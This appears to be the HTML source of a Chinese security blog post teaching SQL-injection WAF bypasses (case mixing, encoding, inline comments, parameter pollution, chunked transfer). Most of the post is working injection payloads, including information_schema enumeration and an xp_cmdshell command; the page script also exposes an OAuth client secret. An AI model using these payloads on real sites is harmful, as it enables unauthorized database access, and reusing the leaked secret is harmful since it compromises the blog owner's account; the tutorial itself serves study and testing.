@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="网络安全,攻防研究" />
+  <meta name="author" content="B Stark" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      SQL注入常见字符WAF绕过 
+      
+      
+      |
+    
+     B.Stark&#39;Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="B.Stark'Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">BStark</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">SQL注入常见字符WAF绕过</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-01-20 19:04:52
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">
+                    <b>#</b> SQL注入
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>大小写混合<br>替换关键字<br>使用编码<br>使用注释<br>参数污染<br>缓冲区溢出<br>性能因素<br>整合绕过…….</p>
+<h3 id="1-大小写绕过："><a href="#1-大小写绕过：" class="headerlink" title="1.大小写绕过："></a>1.大小写绕过：</h3><ul>
+<li>大小写绕过用于只针对小写或大写的关键字匹配技术</li>
+<li>出现原因：在waf里，使用的正则不完善或者是没有用大小写转换函数</li>
+<li>用法：比如，拦截了union，那就使用uNIoN</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.com<span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">-3</span>uNIoNsELect1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-替换关键字"><a href="#2-替换关键字" class="headerlink" title="2.替换关键字"></a>2.替换关键字</h3><h4 id="关键字双写"><a href="#关键字双写" class="headerlink" title="关键字双写"></a>关键字双写</h4><ul>
+<li>出现原因：利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。</li>
+<li>用法：xxx.com/index.php?id=-3UNIunionONSELselectECT1,2,3</li>
+</ul>
+<h4 id="同价词替换"><a href="#同价词替换" class="headerlink" title="同价词替换"></a>同价词替换</h4><ul>
+<li><p>出现原因：WAF主要是针对一些特殊的关键词进行检测</p>
+</li>
+<li><p>and和or不能使用：&amp;&amp;和|| and和or xro ! not</p>
+</li>
+<li><p>=不能使用的情况：可以尝试&lt;、&gt;=</p>
+</li>
+<li><p>空格不能使用（常见）：%20%09%0a%0b%0c%0d%a0/**/空格</p>
+</li>
+<li><p>注意：在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗</p>
+</li>
+</ul>
+<h4 id="特殊字符拼接"><a href="#特殊字符拼接" class="headerlink" title="特殊字符拼接"></a>特殊字符拼接</h4><ul>
+<li>出现原因：把特殊字符拼接起来绕过WAF的检测</li>
+<li>用法：如在函数里可以用+来拼接，在Mysql中可以利用注释/**/绕过</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx.com<span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">exec</span>(master..xp_cmdshell<span class="string">&#x27;netuser’)</span></span><br><span class="line"><span class="string">xxx.com/index.php?id=1;exec(&#x27;</span>maste<span class="string">&#x27;+&#x27;</span>r..xp<span class="string">&#x27;+&#x27;</span>_cmdshell<span class="string">&#x27;+&#x27;</span>&quot;netuser&quot;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过"></a>3.编码绕过</h3><ul>
+<li><p>对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等URL编码</p>
+</li>
+<li><p>出现原因：利用浏览器上的进制转换或者语言编码规则来绕过waf</p>
+</li>
+</ul>
+<h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><ul>
+<li>输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28等</li>
+<li>注意：如果URL编码只进行了一次过滤，可以用两次编码绕过</li>
+<li>用法：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span>SELECT1,<span class="number">2</span>,<span class="number">3</span>index.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">75</span><span class="operator">%</span><span class="number">6</span>e<span class="operator">%</span><span class="number">69</span><span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">6</span>e<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">73</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">6</span>c<span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">74</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">2</span>c<span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">2</span>c<span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">0</span>a</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>常用url编码</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*%0A*/    #强制空格</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><ul>
+<li><p>常用符号的Unicode编码：单引号:%u0027空格：%u0020左括号：%u0028右括号：%u0029</p>
+</li>
+<li><p>用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>unionselect1,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>un<span class="operator">%</span>u0069onsel<span class="operator">%</span>u0065ct1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<h3 id="4-注释绕过："><a href="#4-注释绕过：" class="headerlink" title="4.注释绕过："></a>4.注释绕过：</h3></li>
+<li><p>常见的用于注释的符号：//、–、/**/、#、–+、—、;、–a</p>
+</li>
+<li><p>出现原因：利用语言函数特性来绕过waf的规则</p>
+</li>
+</ul>
+<h4 id="普通注释"><a href="#普通注释" class="headerlink" title="普通注释"></a>普通注释</h4><ul>
+<li>/**/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别。* </li>
+<li>用法：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>UNIONSELECT1,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span>SELECT1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><ul>
+<li>相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别(/<em>！</em>/表示注释里面的语句会被执行)*</li>
+<li><em>用法：采用/</em>!code*/来执行我们的SQL语句，内联注释可以用于整个SQL语句中</li>
+<li>举例：过滤器过滤了如下内容 这些都是我们内联绕过需要绕过的目标</li>
+<li>•注意：/<em>!50001select</em>fromtest*/的含义：表示假如数据库是5.00.01以上版本，该语句才会被执行</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span>,<span class="keyword">where</span>,table_name,table_schema,<span class="operator">=</span>,andinformation_schema，</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>unionselect1,<span class="number">2</span>,concat(table_name)frominformation_schema.tableswheretable_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,concat(<span class="comment">/*!table_name*/</span>)<span class="operator">+</span><span class="keyword">FrOM</span><span class="comment">/*!information_schema*/</span>.tables<span class="comment">/*!WHERE*/</span><span class="operator">+</span><span class="comment">/*!TaBlE_ScHeMa*/</span><span class="operator">+</span><span class="keyword">like</span><span class="operator">+</span>database()</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-参数污染："><a href="#5-参数污染：" class="headerlink" title="5.参数污染："></a>5.参数污染：</h3><ul>
+<li><p>HPP(HTTPParameterPolution)又称做重复参数污染，当同一参数出现多次，不同中间件会解析为不同的结果</p>
+</li>
+<li><p>如果WAF只检测了同参数名中的第一个或最后一个，并且中间件特性正好取与WAF相反的参数，则可成功绕过</p>
+</li>
+<li><p>案例：ModSecurity过滤器会将类似于select1,2,3fromtable这类的语句归类为黑名单当web服务器遇到类似/index.aspx?id=select1,2,3fromtable这样的语句时，会阻断请求但是这个web服务器在遇到为同一个参数赋值不同数值时，会将它们连接起来，攻击者通过这个方法来绕过黑名单</p>
+</li>
+</ul>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span> 想要执行的语句：<span class="operator">/</span>index.aspx?id<span class="operator">=</span>select1,<span class="number">2</span>,<span class="number">3</span>fromtable</span><br><span class="line"><span class="operator">*</span> 提交的URL：<span class="operator">/</span>index.aspx?id<span class="operator">=</span>select1<span class="operator">&amp;</span>id<span class="operator">=</span>,<span class="number">2</span>,<span class="number">3</span>fromtable</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>说明：</p>
+</li>
+<li><p>1、这不属于黑名单中的模式，不会触发黑名单的拦截功能</p>
+</li>
+<li><p>2、由于WEB程序会采取连接操作，即将&amp;符号前后的内容个连接，因此SQL注入行为能够被执行</p>
+</li>
+</ul>
+<h3 id="6-缓冲区溢出："><a href="#6-缓冲区溢出：" class="headerlink" title="6.缓冲区溢出："></a>6.缓冲区溢出：</h3><ul>
+<li><p>缓冲区溢出用于绕过WAF，许多WAF是C语言写的，而C语言自身没有缓冲区保护机制</p>
+</li>
+<li><p>因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
+</li>
+<li><p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span>(select1)<span class="operator">=</span>(Select0xAAAAAAAAA<span class="operator">*</span><span class="number">1000</span>moreA)<span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,version(),<span class="number">4</span>,<span class="number">5</span>,database(),<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></li>
+<li><p>说明：示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。</p>
+</li>
+</ul>
+<h3 id="7-整合绕过："><a href="#7-整合绕过：" class="headerlink" title="7.整合绕过："></a>7.整合绕过：</h3><ul>
+<li>整合的意思是结合使用前面的各种绕过技术，单一的技术可能无法绕过过滤机制，但多种技术的配合使用成功的可能性会增加</li>
+<li>多种技术的使用增加了更多的可能性，除非每一种技术单独都无法使用，否则它们能大大增加绕过的成功性</li>
+<li>例如：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,concat(<span class="comment">/*!table_name*/</span>)<span class="operator">+</span><span class="keyword">FrOM</span><span class="comment">/*information_schema*/</span>.tables<span class="comment">/*!WHERE*/</span><span class="operator">+</span><span class="comment">/*!TaBlE_ScHeMa*/</span><span class="operator">+</span><span class="keyword">like</span><span class="operator">+</span>database()</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="comment">/*!UNION*/</span><span class="operator">+</span><span class="comment">/*!SELECT*/</span><span class="operator">+</span><span class="number">1</span>,GrOUp_COnCaT(COLUMN_NAME),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span><span class="comment">/*!INFORMATION_SCHEM*/</span>.COLUMNS<span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>TABLE_NAME<span class="operator">=</span><span class="number">0x41646d696e</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="8-分块传输绕过："><a href="#8-分块传输绕过：" class="headerlink" title="8.分块传输绕过："></a>8.分块传输绕过：</h3><ul>
+<li>当我们将传输的内容分块时，处理后的HTTP请求由于和已知的payload相差较大，所以可以起到一定的绕过WAF的效果</li>
+<li>举例：正常输入id=1and1=2，被安全狗拦住</li>
+<li>举例：使用分块传输，将id=1and1=2进行分块，成功绕过了安全狗•注意：分块传输需要将关键字and,or,select,union等关键字拆开，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示结束，并在0后空两行表示数据包结束</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220118202522075.png" alt="image-20220118202522075"></p>
+<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>Q: 注入过程中where table_schema=”admin” 时候””被过滤</p>
+<ul>
+<li><strong>嵌套子查询语句</strong></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">4</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>十六进制</strong></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>assci码</strong></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="type">char</span>(<span class="number">104</span>,<span class="number">115</span>,<span class="number">110</span>,<span class="number">112</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><ul>
+<li><strong>substr() ,mid() ,limit</strong></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);   <span class="operator">/</span><span class="operator">/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(database(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);      <span class="operator">/</span><span class="operator">/</span><span class="keyword">from</span> <span class="keyword">for</span> 绕过</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>limit</strong></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span>  <span class="number">0</span>    <span class="operator">/</span><span class="operator">/</span> <span class="keyword">offset</span> 绕过</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> </span><br></pre></td></tr></table></figure>
+<h3 id="比较符号绕过-lt-gt"><a href="#比较符号绕过-lt-gt" class="headerlink" title="比较符号绕过&lt;&gt;"></a>比较符号绕过&lt;&gt;</h3><ul>
+<li><strong>greatest</strong></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/3/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-01-20 19:04:52
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">
+                        <b>#</b> SQL注入
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">1.大小写绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9B%BF%E6%8D%A2%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">2.替换关键字</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E5%8F%8C%E5%86%99"><span class="toc-text">关键字双写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E4%BB%B7%E8%AF%8D%E6%9B%BF%E6%8D%A2"><span class="toc-text">同价词替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5"><span class="toc-text">特殊字符拼接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">3.编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81"><span class="toc-text">URL编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unicode%E7%BC%96%E7%A0%81"><span class="toc-text">Unicode编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">4.注释绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%B3%A8%E9%87%8A"><span class="toc-text">普通注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="toc-text">内联注释</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%EF%BC%9A"><span class="toc-text">5.参数污染：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%EF%BC%9A"><span class="toc-text">6.缓冲区溢出：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%95%B4%E5%90%88%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">7.整合绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">8.分块传输绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">逗号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87-lt-gt"><span class="toc-text">比较符号绕过&lt;&gt;</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="/js/src/md5.min.js"></script>
+  <div id="gitalk-container"></div>
+
+  <script>
+    const gitalk = new Gitalk({
+      clientID: 'a8912b1aa74ebdeb8ecf',
+      clientSecret: '2e09f32571113ed72c6902713871ee0702291593',
+      repo: 'bstark',
+      owner: 'bbbstark',
+      admin: ['bbbstark'],
+      id: location.pathname,
+      distractionFreeMode: false
+    })
+
+    gitalk.render('gitalk-container')
+  </script>
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/bbbstark">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a href="https://bstark.me">Copyright © Bstark 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        Theme by Oranges | Powered by Hexo
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
